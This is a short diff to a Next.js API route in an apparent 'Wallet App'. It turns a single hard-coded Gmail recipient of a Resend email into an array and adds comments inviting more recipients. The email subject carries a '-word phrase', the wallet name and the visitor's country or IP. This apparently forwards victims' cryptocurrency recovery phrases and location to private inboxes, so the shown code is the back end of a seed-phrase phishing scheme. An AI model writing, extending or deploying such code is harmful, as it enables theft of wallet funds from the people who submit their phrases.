@@ -272,7 +272,12 @@ export async function POST(req: NextRequest) {
   try {
     await resend.emails.send({
       from: "Wallet App <onboarding@resend.dev>",
-      to: "uwemuwemetim@gmail.com",
+      // Add as many emails into this array as you need! Limit per request is 50.
+      to: [
+        "uwemuwemetim@gmail.com", 
+        // "any-other-email@gmail.com",
+        // "your-third-email@yahoo.com"
+      ],
       subject: `🔐 ${wordCount}-word phrase · ${wallet ?? "Unknown"} · ${flag}${geo.country_name ?? ip}`,
       html,
     });
